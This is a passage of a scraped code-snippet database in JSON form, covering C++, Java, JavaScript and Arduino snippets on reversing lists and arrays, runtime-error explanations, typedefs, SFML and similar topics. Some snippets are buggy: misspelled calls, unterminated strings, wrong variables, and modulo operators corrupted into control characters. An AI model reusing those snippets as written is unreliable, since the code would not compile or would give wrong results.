void print()  \t{  \t\tNode temp = head;  \t\twhile (temp != null) {  \t\t\tSystem.out.print(temp.data + \" \");  \t\t\ttemp = temp.next;  \t\t}  \t\tSystem.out.println();  \t}  \tstatic void push(int data)  \t{  \t\tNode temp = new Node(data);  \t\ttemp.next = head;  \t\thead = temp;  \t} /* Driver program to test above function*/ public static void main(String args[])  {  \t/* Start with the empty list */ \tpush(20);  \tpush(4);  \tpush(15);  \tpush(85);  \tSystem.out.println(\"Given linked list\");  \tprint();  \thead = reverse(head);  \tSystem.out.println(\"Reversed Linked list\");  \tprint();  } } // This code is contributed by Prakhar Agarwal \n\t    /* Before changing next pointer of current node,         store the next node */         next = curr -> next         /*  Change next pointer of current node */         /* Actual reversing */         curr -> next = prev         /*  Move prev and curr one step ahead */         prev = curr         curr = next \n#include<bits/stdc++.h>   using namespace std;   struct node {     int data;     struct node *next; };   // To create a demo we have to construct a linked list and this  // function is to push the elements to the list.  void push(struct node **head_ref, int data) {     struct node *node;     node = (struct node*)malloc(sizeof(struct node));     node->data = data;     node->next = (*head_ref);     (*head_ref) = node; }   // Function to reverse the list void reverse(struct node **head_ref) {     struct node *temp = NULL;     struct node *prev = NULL;     struct node *current = (*head_ref);     while(current != NULL) {         temp = current->next;         current->next = prev;         prev = current;         current = temp;     }     (*head_ref) = prev; }   // To check our program  void printnodes(struct node *head) {     while(head != NULL) {         cout<<head->data<<\" \";         head = head->next;     } }   // Driver function int main() {     struct node *head = NULL;     push(&head, 0);     push(&head, 1);     push(&head, 8);     push(&head, 0);     push(&head, 4);     push(&head, 10);     cout << \"Linked List Before Reversing\" << endl;     printnodes(head);     reverse(&head);     cout << endl;     cout << \"Linked List After Reversing\"<<endl;     printnodes(head);     return 0; } \n// using iterative method to reverse linked list in JavaScript // time complexity: O(n) & space complexity: O(1) reverse() {       if (!this.head.next) {         return this.head;       }              let prevNode = null;       let currNode = this.head;       let nextNode = this.head;       while(nextNode){         nextNode = currNode.next;         currNode.next = prevNode;         prevNode = currNode;         currNode = nextNode;       }       this.head = prevNode;       return this.printList();     }\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 357,
    "keyword": null,
    "link": null,
    "title": " Reverse string C++",
    "description": "reverse(str.begin(),str.end());\n#include <iostream> #include<string> #include<algorithm> using namespace std; int main() { string str;   getline(cin,str);   reverse(str.begin(),str.end());   cout<<str; }\n#include <iostream> using namespace std;  int main() {     string greeting = \"Hello\";   int len = greeting.length();   int n=len-1;   for(int i=0;i<(len/2);i++){     //Using the swap method to switch values at each index     swap(greeting[i],greeting[n]);     n = n-1;    }   cout<<greeting<<endl; }\n#include <iostream> //The library below must be included for the reverse function to work #include<bits/stdc++.h>  using namespace std;  int main() {      string greeting = \"Hello\";   //Note that it takes the iterators to the start and end of the string as arguments   reverse(greeting.begin(),greeting.end());   cout<<greeting<<endl; }\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 358,
    "keyword": null,
    "link": null,
    "title": " Reversing an array",
    "description": "var arr=[1,2,5,6,2] arr.reverse()\nint length = array.length; \t\tfor(int i=0;i<length/2;i++) { \t\t\tint swap = array[i]; \t\t\tarray[i] = array[length-i-1]; \t\t\tarray[length-i-1] = swap; \t\t} or Collections.reverse(Arrays.asList(array)); \narray = [1 2, 3] reversed = array.reverse()\n//java program to reverse array using for loop public class ReverseArrayDemo  {    public static void main(String[] args)     {       int[] arrNumbers = new int[]{2, 4, 6, 8, 10};         System.out.println(\"Given array: \");         for(int a = 0; a < arrNumbers.length; a++)       {          System.out.print(arrNumbers[a] + \" \");       }       System.out.println(\"Reverse array: \");       // looping array in reverse order       for(int a = arrNumbers.length - 1; a >= 0; a--)        {            System.out.print(arrNumbers[a] + \" \");         }    } }\nimport java.util.Arrays; public class ReverseStringArrayInJava {    public static void main(String[] args)    {       String[] strHierarchy = new String[]{\"Junior Developer\",\"Senior Developer\",\"Team Lead\",\"Project Manager\",\"Senior Manager\",\"CEO\"};       System.out.println(\"Given string array: \" + Arrays.toString(strHierarchy));       for(int a = 0; a < strHierarchy.length / 2; a++)       {          String strTemp = strHierarchy[a];          strHierarchy[a] = strHierarchy[strHierarchy.length - a - 1];          strHierarchy[strHierarchy.length - a - 1] = strTemp;       }       System.out.println(\"Reversed string array: \");       for(int a = 0; a < strHierarchy.length; a++)       {          System.out.println(strHierarchy[a]);       }    } }\n#include<iostream> using namespace std; int main() { \tint Arr[100],n,temp,i,j; \tcout<<\"Enter number of elements you want to insert \"; \tcin>>n; \tfor(i=0;i<n;i++) \t{ \t\tcout<<\"Enter element \"<<i+1<<\":\"; \t\tcin>>Arr[i]; \t} \tfor(i=0,j=n-1;i<n/2;i++,j--) \t{ \t\ttemp=Arr[i]; \t\tArr[i]=Arr[j]; \t\tArr[j]=temp; \t} \tcout<<\"\\nReverse array\"<<endl; \tfor(i=0;i<n;i++) \t\tcout<<Arr[i]<<\" \"; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 359,
    "keyword": null,
    "link": null,
    "title": " Ricarian contract EOS example",
    "description": "\"actions\": [   {     \"name\": \"createpost\",     \"type\": \"createpost\",     \"ricardian_contract\": \"---\\ntitle: Create Post\\nsummary: Create a blog post \\\"{{title}}\\\" by {{author}} tagged as \\\"{{tag}}\\\"\\nicon: https://app.com/create-post.png#00506E08A55BCF269FE67F202BBC08CFF55F9E3C7CD4459ECB90205BF3C3B562\\n---\\nI, {{author}}, author of the blog post \\\"{{title}}\\\", certify that I am the original author of the contents of this blog post and have attributed all external sources appropriately.\\n\\n{{$clauses.legalese}}\"   } ],  ...  \"ricardian_clauses\": [   {     \"id\": \"legalese\",     \"body\": \"WARRANTY. The invoker of the contract action shall uphold its Obligations under this Contract in a timely and workmanlike manner, using knowledge and recommendations for performing the services which meet generally acceptable standards set forth by EOS.IO Blockchain Block Producers.\"   } ]\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 360,
    "keyword": null,
    "link": null,
    "title": " Road sign detection and recognition by OpenCV in c",
    "description": "opencv_traincascade -data data -vec signs.vec -bg bg.txt -numPos 60 -numNeg 200 -numStages 15 -w 50 -h 50 -featureType LBP \n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 361,
    "keyword": null,
    "link": null,
    "title": " Runtime Error: Runtime ErrorAbort signal from abort(3) (SIGABRT)",
    "description": "SIGABRT &ndash; If an error itself is detected by the program then this signal  is generated using call to abort(). This signal is also used by standard library to report an internal error. assert() function in c++ also uses abort() to generate this signal.\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 362,
    "keyword": null,
    "link": null,
    "title": " Runtime Error: Runtime ErrorBad memory access (SIGBUS)",
    "description": "Bus errors are rare nowadays on x86 and occur when your processor cannot even attempt  the memory access requested, typically:  using a processor instruction with an address that does  not satisfy its alignment requirements. Segmentation faults occur when accessing memory which  does not belong to your process, they are very common and are typically the result of:  using a pointer to something that was deallocated. using an uninitialized hence bogus pointer. using a null pointer. overflowing a buffer.\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 363,
    "keyword": null,
    "link": null,
    "title": " Runtime Error: Runtime ErrorFloating-point exception (SIGFPE",
    "description": "I keep getting SIGFPE error when i try to run my program.  Why so? This is the easiest runtime error to debug - it is a floating point error. It is virtually always caused by a division by 0, so check any divisions or  modulo operations in your code carefully.\n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 364,
    "keyword": null,
    "link": null,
    "title": " Runtime error(Exit status:153(File size limit exceeded)) c++",
    "description": "Runtime error(Exit status:153(File size limit exceeded)) \n",
    "reg_date": "2021-10-12T11:37:04.000Z"
  },
  {
    "id": 365,
    "keyword": null,
    "link": null,
    "title": " SDL BlitSurface",
    "description": "int SDL_BlitSurface(SDL_Surface*    src,                     const SDL_Rect* srcrect,                     SDL_Surface*    dst,                     SDL_Rect*       dstrect)\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 366,
    "keyword": null,
    "link": null,
    "title": " SET TO NULL pointer c++",
    "description": "*ptr=NULL; /*or*/ *ptr=0;\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 367,
    "keyword": null,
    "link": null,
    "title": " SFML texture from file max size",
    "description": "int max_size_in_pixel = sf::Texture::getMaximumSize();\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 368,
    "keyword": null,
    "link": null,
    "title": " SFML window",
    "description": "int main() {     sf::RenderWindow window(sf::VideoMode(800, 600), \"My window\");      // run the program as long as the window is open     while (window.isOpen())     {         // check all the window's events that were triggered since the last iteration of the loop         sf::Event event;         while (window.pollEvent(event))         {             // \"close requested\" event: we close the window             if (event.type == sf::Event::Closed)                 window.close();         }     }      return 0; }\nsf::RenderWindow window(sf::VideoMode(900,900),\"My window\"); //VideoMode is an object who tell to the window which size take\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 369,
    "keyword": null,
    "link": null,
    "title": " SPEED c++",
    "description": "#define SPEED ios::sync_with_stdio(false); cin.tie(0); cout.tie(0)\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 370,
    "keyword": null,
    "link": null,
    "title": " STD::ERASE FUNCTION IN C++",
    "description": "iterator erase (iterator position); iterator erase (iterator first, iterator last); \n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 371,
    "keyword": null,
    "link": null,
    "title": " STL c++",
    "description": "#include<stdio.h>  #include<string.h>    int main()  {              char char1[] = \"coucou\";      char char2[] = \"coucou\";           \tif( strcmp(char1, char2) == 0 )        printf(\"Strings are the same\");      \telse       prinf(\"Strings are differentes\");           return 0;  }\nGood Website to learn: https://en.cppreference.com/w/cpp/container https://www.cplusplus.com/reference/stl/ https://www.geeksforgeeks.org/the-c-standard-template-library-stl/\n#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\nint strcmp ( const char * str1, const char * str2 );  // returning value | indicates // <0\tthe first character that does not match has a lower value in ptr1 than in ptr2 // 0\tthe contents of both strings are equal // >0\tthe first character that does not match has a greater value in ptr1 than in ptr2 \n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 372,
    "keyword": null,
    "link": null,
    "title": " See Compilation Time in c++ Program",
    "description": "#include <bits/stdc++.h> #include<chrono> using namespace std; auto start = chrono::steady_clock::now();  int main(){ \t     cout<<\"My name is Devil\"<<endl;      auto end= chrono::steady_clock::now();     auto diff = end - start;     cout<<chrono::duration<double,milli>(diff).count()<<\" ms\"<<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 373,
    "keyword": null,
    "link": null,
    "title": " Segmentation fault (core dumped)",
    "description": "You might be working with a lot of data and your RAM is full\nA segmentation fault (aka segfault) is a common condition that causes programs to crash; they are often associated with a file named core.  Segfaults are caused by a program trying to read or write an illegal memory location\nSegfaults are caused by a program trying to read or write an illegal memory location\n## Segmentation Fault ##  when it will come ? READ Conditions below ...  - segmentation fault comes when you have an array of 10 size and   you are accessing the arr[12] so you are accessing the unknown memory   which is not yours so it will gives you error...    - If you are asking for memory but it doesnt have any memory left so error...  ...so both conditions above will gives you error as segmentation fault.\nCore Dump/Segmentation fault is a specific kind of error caused by  accessing memory that &ldquo;does not belong to you.&rdquo;  In C++ this can be caused by: ~Accessing an address that is freed ~Accessing out of array index bounds ~Stack Overflow ~Dereferencing uninitialized pointer\nIf your not using a lot of ram, your probobly indexing WAY out of bounds on a vertex or array. C++ btw.\n",
    "reg_date": "2021-10-12T11:37:05.000Z"
  },
  {
    "id": 374,
    "keyword": null,
    "link": null,
    "title": " Setting a number of decimals on a float on C++",
    "description": "#include <iostream> #include <iomanip> using namespace std;  int main() { \tfloat x=10.3445f; \t \tcout<<fixed<<setprecision(5)<<x<<endl; \tcout<<fixed<<setprecision(2)<<x<<endl; \tcout<<fixed<<setprecision(3)<<x<<endl; \tcout<<fixed<<setprecision(0)<<x<<endl; \t \treturn 0; } \ncout.setf(ios::fixed); cout.precision(2);\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 375,
    "keyword": null,
    "link": null,
    "title": " Shell-Sort C++",
    "description": "C/C++/Java 1  gap = X; 2  do 3  { ok = 1; 4  for (i = 1; i<= N &ndash; gap; i++) 5    if (A[i] > A[i+gap]) 6    {  temp = A[i]; 7       A[i] = A[i+gap]; 8       A[i+gap] = temp; 9       ok = 0; 10   } 11 if (gap/2 > 1) gap=gap/2; else gap=1; 12 } while (ok == 0);\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 376,
    "keyword": null,
    "link": null,
    "title": " Simple Array of 4 Element for Beginner c++",
    "description": "// This is Array of 4 Element    string cars[4] = {\"Volvo\", \"BMW\", \"Ford\", \"Mazda\"}; // Example of Array    \n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 377,
    "keyword": null,
    "link": null,
    "title": " Simple cpp code",
    "description": "#include<iostream> using namespace std;  int main() { cout << \" hello world <<endl;      return 0; }\n#include<iostream> using namespace std;  int main() { cout << \" hello world\" <<endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 378,
    "keyword": null,
    "link": null,
    "title": " Solution::longestPalindrome(string A)",
    "description": "123456789101112131415161718192021222324252627282930313233343536373839404142string Solution::longestPalindrome(string A) {   string str;    int n = A.length();    int first = 1;    int second = 0;    for(int i = n-1; i >= 0; i--)    {        int low = i;        int high =  n-1;        int check1 = i;        int check2 = n-1;        while(low <= high)        {            if(A[low] == A[high])            {                low++;high--;            }            else if (low == i)            {                 high--;                 check2 = high;            }            else            {                low = i;                high = check2-1;                check2 = high;            }        }        //cout << check1 << \" \" << check2 << \" \";        if(second - first <= check2 - check1 )        {            second = check2;            first = check1;          //  cout << first << \" \"<< second << \" \";        }    }    for(int i = first; i <=  second; i++)    str+=A[i];    return str;}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 379,
    "keyword": null,
    "link": null,
    "title": " Sort by the distance between pairs c++",
    "description": "sort(begin(data), end(data),      [](pair<int, int> const& a, pair<int, int> const& b) {      return abs(a.first-a.second)<abs(b.first-b.second); }); \n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 380,
    "keyword": null,
    "link": null,
    "title": " Specific Pair in Matrix",
    "description": "#include<iostream> #define N 5 using namespace std; int findMaxValue(int matrix[][N]) {    int maxValue = -99999;    int arr_max[N][N];    arr_max[N-1][N-1] = matrix[N-1][N-1];    int max_val = matrix[N-1][N-1];    for (int j = N - 2; j >= 0; j--) {       if (matrix[N-1][j] > max_val)       max_val = matrix[N - 1][j];       arr_max[N-1][j] = max_val;    }    max_val = matrix[N - 1][N - 1];    for (int i = N - 2; i >= 0; i--) {       if (matrix[i][N - 1] > max_val)       max_val = matrix[i][N - 1];       arr_max[i][N - 1] = max_val;    }    for (int i = N-2; i >= 0; i--) {       for (int j = N-2; j >= 0; j--) {          if (arr_max[i+1][j+1] - matrix[i][j] > maxValue)          maxValue = arr_max[i + 1][j + 1] - matrix[i][j];          arr_max[i][j] = max(matrix[i][j],max(arr_max[i][j + 1],arr_max[i + 1][j]) );       }    }    return maxValue; } int main() {    int mat[N][N] = {       { 1, 2, -1, -4, -20 },       { -8, -3, 4, 2, 1 },       { 3, 8, 6, 1, 3 },       { -4, -1, 1, 7, -6 },       { 0, -4, 10, -5, 1 }    };    cout << \"Maximum Value is \" << findMaxValue(mat); }\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 381,
    "keyword": null,
    "link": null,
    "title": " Specific pair in matrix c++",
    "description": "#include<iostream> #define N 5 using namespace std; int findMaxValue(int matrix[][N]) {    int maxValue = -99999;    int arr_max[N][N];    arr_max[N-1][N-1] = matrix[N-1][N-1];    int max_val = matrix[N-1][N-1];    for (int j = N - 2; j >= 0; j--) {       if (matrix[N-1][j] > max_val)       max_val = matrix[N - 1][j];       arr_max[N-1][j] = max_val;    }    max_val = matrix[N - 1][N - 1];    for (int i = N - 2; i >= 0; i--) {       if (matrix[i][N - 1] > max_val)       max_val = matrix[i][N - 1];       arr_max[i][N - 1] = max_val;    }    for (int i = N-2; i >= 0; i--) {       for (int j = N-2; j >= 0; j--) {          if (arr_max[i+1][j+1] - matrix[i][j] > maxValue)          maxValue = arr_max[i + 1][j + 1] - matrix[i][j];          arr_max[i][j] = max(matrix[i][j],max(arr_max[i][j + 1],arr_max[i + 1][j]) );       }    }    return maxValue; } int main() {    int mat[N][N] = {       { 1, 2, -1, -4, -20 },       { -8, -3, 4, 2, 1 },       { 3, 8, 6, 1, 3 },       { -4, -1, 1, 7, -6 },       { 0, -4, 10, -5, 1 }    };    cout << \"Maximum Value is \" << findMaxValue(mat); }\n",
    "reg_date": "2021-10-12T11:37:06.000Z"
  },
  {
    "id": 382,
    "keyword": null,
    "link": null,
    "title": " Spiral Traversal Of a matrix",
    "description": "vector<int> Solution::spiralOrder(const vector<vector<int> > &A) {    int row_start = 0, row_end = A.size()-1, col_start = 0, col_end = A[0].size()-1;    vector<int> v;    while (row_start<=row_end  && col_start<=col_end)    {        //for row_start        for (int col = col_start; col<=col_end; col++)        {           v.push_back(A[row_start][col]);        }        row_start++;        //for col_end        for (int row = row_start; row<= row_end; row++)        {            v.push_back(A[row][col_end]);        }        col_end--;        //for row_end        for (int col = col_end; col>=col_start; col--)        {            v.push_back(A[row_end][col]);        }        row_end--;        //for col_start        for (int row = row_end; row>=row_start; row--)        {            v.push_back(A[row][col_start]);        }          col_start++;    }    return v;}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nvoid print_spiral(A[][], m, n){    k = 0, l = 0    while (k < m && l < n)      {        /* Print the first row from the remaining rows */        for (i=l to n-1)            print(A[k][i])          k++          /* Print the last column from the remaining columns */        for (i = k to i = m-1 )            print(A[i][n-1])          n--           /* Print the last row from the remaining rows */        if ( k < m)         {            for (i = n-1; i >= l; --i)                   print(A[m-1][i])             m--        }          /* Print the first column from the remaining columns */        if (l < n) :        {            for (i = m-1; i >= k; --i)                   print(A[i][l])               l++        }    }}\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 383,
    "keyword": null,
    "link": null,
    "title": " Split a number and store it in vector",
    "description": "#include <bits/stdc++.h> using namespace std; main() { \tint n = 1213456; \tvector<int> v; \tfor(; n; n/=10)   \t\tv.push_back( n\u0010 ); \treverse(v.begin(), v.end()); \tfor (auto &i : v) cout<<i; }\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 384,
    "keyword": null,
    "link": null,
    "title": " Stream Overloading",
    "description": "// #include <bits/stdc++.h> // #include<chrono> // using namespace std; // auto start = chrono::steady_clock::now();  // int main(){ //     cout<<\"My name is Devil\"<<endl; //     auto end= chrono::steady_clock::now(); //     auto diff = end - start; //     cout<<chrono::duration<double,milli>(diff).count()<<\" ms\"<<endl; //     return 0; // }  // #include <bits/stdc++.h> // #include<chrono> // using namespace std; // auto start = chrono::steady_clock::now();  // int main(){      //     cout<<\"Hello how are u Akash kumar jiii\"<<endl; //     auto end= chrono::steady_clock::now(); //     auto diff = end - start; //     cout<<chrono::duration<double,milli>(diff).count()<<\"ms\"<<endl; //     return 0; // }  #include<bits/stdc++.h> #include<stdexcept> #include<chrono> using namespace std; auto start = chrono::steady_clock::now();  class Person{ \tstring name; \tint age; \tpublic:\t \t\tPerson(){ \t\t\tthis->name = \"No name\"; \t\t\tthis->age = 0; \t\t} \t\tfriend ostream &operator <<(ostream &output , Person &p); \t\tfriend istream &operator >>(istream &input , Person &p); };  ostream &operator <<(ostream &output , Person &p){ \toutput<<\"Who is Devil \"<<endl; \toutput<<\"My name is \"<<p.name<<\" My age is \"<<p.age<<endl; \treturn output; } istream &operator >>(istream &input , Person &p){ \tcin>>p.name>>p.age; \treturn input; }  int main(){ \tcout<<\"Enter the name \"<<endl; \tPerson ak; \tcin>>ak; \tcout<<ak;      auto end= chrono::steady_clock::now();     auto diff = end - start;     cout<<chrono::duration<double,milli>(diff).count()<<\" ms\"<<endl; }\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 385,
    "keyword": null,
    "link": null,
    "title": " String concatination in C++",
    "description": "// with C++11 string result = name + std::to_string(age);\n#include <iostream> #include <cstdlib>  std::string text = \"hello\"; std::string moretext = \"there\"; std::string together = text + moretext; std::cout << together << std::endl;  >> hello there\nint x=5; int y= 10;  int z = x+y;//z==15  string s1=\"Abhi\"; string s2=\"gautam\";  string s3= s1+s3;//s3==Abhigautam \n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 386,
    "keyword": null,
    "link": null,
    "title": " Sum of Distances in Tree",
    "description": "    vector<unordered_set<int>> tree;     vector<int> res, count;      vector<int> sumOfDistancesInTree(int N, vector<vector<int>>& edges) {         tree.resize(N);         res.assign(N, 0);         count.assign(N, 1);         for (auto e : edges) {             tree[e[0]].insert(e[1]);             tree[e[1]].insert(e[0]);         }         dfs(0, -1);         dfs2(0, -1);         return res;      }      void dfs(int root, int pre) {         for (auto i : tree[root]) {             if (i == pre) continue;             dfs(i, root);             count[root] += count[i];             res[root] += res[i] + count[i];         }     }      void dfs2(int root, int pre) {         for (auto i : tree[root]) {             if (i == pre) continue;             res[i] = res[root] - count[i] + count.size() - count[i];             dfs2(i, root);         }     } \n    int[] res, count;     ArrayList<HashSet<Integer>> tree;     public int[] sumOfDistancesInTree(int N, int[][] edges) {         tree = new ArrayList<HashSet<Integer>>();         res = new int[N];         count = new int[N];         for (int i = 0; i < N ; ++i)             tree.add(new HashSet<Integer>());         for (int[] e : edges) {             tree.get(e[0]).add(e[1]);             tree.get(e[1]).add(e[0]);         }         dfs(0, -1);         dfs2(0, -1);         return res;     }      public void dfs(int root, int pre) {         for (int i : tree.get(root)) {             if (i == pre) continue;             dfs(i, root);             count[root] += count[i];             res[root] += res[i] + count[i];         }         count[root]++;     }       public void dfs2(int root, int pre) {         for (int i : tree.get(root)) {             if (i == pre) continue;             res[i] = res[root] - count[i] + count.length - count[i];             dfs2(i, root);         }     } \n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 387,
    "keyword": null,
    "link": null,
    "title": " Sum of first and last digit of a number in C++",
    "description": "// not my code but I figured it would be useful  int number, sum=0, firstDigit, lastDigit;       //Reading a number from user     cout<<\"Enter any number:\";     cin>>number;       lastDigit = number % 10;      firstDigit = number;      while(number >= 10)     {         number = number / 10;     }     firstDigit = number;       //Finding sum of first and last digit     sum = firstDigit + lastDigit;      cout<<\"Sum of first and last digit: \"<<sum;\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 388,
    "keyword": null,
    "link": null,
    "title": " Sum of two large numbers in C++",
    "description": "#include<iostream> int add(int,int); int main() { \tusing namespace std; \tint a,b; \tcout<<\"Enter first number: \"; \tcin>>a; \tcout<<\"Enter second number: \"; \tcin>>b; \tcout<<\"Sum = \"<<add(a,b); } int add(int x,int y) { \treturn(x+y); }\n#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\nstring sum(string a, string b){     string res=\"\";     while(a.length() < b.length()) a=\"0\"+a;     while(b.length() < a.length()) b=\"0\"+b;     int carry=0;     for(int i=a.length()-1;i>=0;i--)     {         int tmp=a[i]-48 + b[i]-48 + carry;         carry=tmp/10;         tmp=tmp\u0010;         res=(char)(tmp+48)+res;     }     if(carry>0) res=\"1\"+res;     return res; }\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 389,
    "keyword": null,
    "link": null,
    "title": " Summation of Natural Number Sequence with c and c++.",
    "description": "#include<bits/stdc++.h> using namespace std; int main() {       unsigned int a, b;       long long int sum = 0, n;       double s1;       cin >> a >> b;       n = (b-a) + 1;       sum = n * ((double)(a+b) / 2);       cout << sum << endl;           return 0; }\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 390,
    "keyword": null,
    "link": null,
    "title": " TCA9548 I2CScanner Arduino",
    "description": "/**  * TCA9548 I2CScanner.ino -- I2C bus scanner for Arduino  *  * Based on https://playground.arduino.cc/Main/I2cScanner/  *  */  #include \"Wire.h\"  #define TCAADDR 0x70  void tcaselect(uint8_t i) {   if (i > 7) return;     Wire.beginTransmission(TCAADDR);   Wire.write(1 << i);   Wire.endTransmission();   }   // standard Arduino setup() void setup() {     while (!Serial);     delay(1000);      Wire.begin();          Serial.begin(115200);     Serial.println(\"\\nTCAScanner ready!\");          for (uint8_t t=0; t<8; t++) {       tcaselect(t);       Serial.print(\"TCA Port #\"); Serial.println(t);        for (uint8_t addr = 0; addr<=127; addr++) {         if (addr == TCAADDR) continue;          Wire.beginTransmission(addr);         if (!Wire.endTransmission()) {           Serial.print(\"Found I2C 0x\");  Serial.println(addr,HEX);         }       }     }     Serial.println(\"\\ndone\"); }  void loop()  { }\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 391,
    "keyword": null,
    "link": null,
    "title": " TYPEDEF c++",
    "description": "static_cast conversion  C++ C++ language Expressions  Converts between types using a combination of implicit and user-defined conversions.  Syntax static_cast < new_type > ( expression )\t\t Returns a value of type new_type.\ntypedef struct {   \t//add different parts of the struct here  \tstring username;   \tstring password; } user; // name of struct - you can name this whatever  user example; //variable of type user  example.username = \"Comfortable Caterpillar\"; // username part of example variable example.password = \"password\" // password part of example variable    if (user.username == \"Comfortable Caterpillar\") { \tprintf(\"upvote this if it helped!\"); }\n// typedef [type] [alias] // Example: typedef unsigned long int ulong;  ulong someNumber = 158426;\ntypedef int myint; \n#include <iostream>  int main(){ \ttypedef unsigned int ui; \tui i = 5, j = 8; \tstd::cout << \"i = \" << i << std::endl; \tstd::cout << \"j = \" << j << std::endl; \treturn 0; } \n// simple typedef typedef unsigned long ulong;   // the following two objects have the same type unsigned long l1; ulong l2;   // more complicated typedef typedef int int_t, *intp_t, (&fp)(int, ulong), arr_t[10];   // the following two objects have the same type int a1[10]; arr_t a2;   // common C idiom to avoid having to write \"struct S\" typedef struct {int a; int b;} S, *pS;   // the following two objects have the same type pS ps1; S* ps2;   // error: storage-class-specifier cannot appear in a typedef declaration // typedef static unsigned int uint;   // typedef can be used anywhere in the decl-specifier-seq long unsigned typedef int long ullong; // more conventionally spelled \"typedef unsigned long long int ullong;\"   // std::add_const, like many other metafunctions, use member typedefs template< class T> struct add_const {     typedef const T type; };   typedef struct Node {     struct listNode* next; // declares a new (incomplete) struct type named listNode } listNode; // error: conflicts with the previously declared struct name\n",
    "reg_date": "2021-10-12T11:37:07.000Z"
  },
  {
    "id": 392,
    "keyword": null,
    "link": null,
    "title": " Take two integers, return the quotient and remainder, divmod",
    "description": "//  Take two integers, return the quotient and remainder  #include <iostream> using namespace std;  auto divmod(int dividend, int divisor) {     struct result {int quotient; int remainder;};     return result {dividend / divisor, dividend % divisor}; }  int main() {     auto result = divmod(14, 3);     cout << result.quotient << \", \" << result.remainder << endl;      // or      auto [quotient, remainder] = divmod(14, 3);     cout << quotient << \", \" << remainder << endl; }\n//  Take two integers, return the quotient and remainder fn divmod(dividend: isize, divisor: isize) -> (isize, isize) {     (dividend / divisor, dividend % divisor) }  fn main() {     let (q, r) = divmod(14, 3);     println!(\"divmod = quotient {}, remainder {} \", q, r); }\n",
    "reg_date": "2021-10-12T11:37:08.000Z"
  },
  {
    "id": 393,
    "keyword": null,
    "link": null,
    "title": " Tempalte in c++",
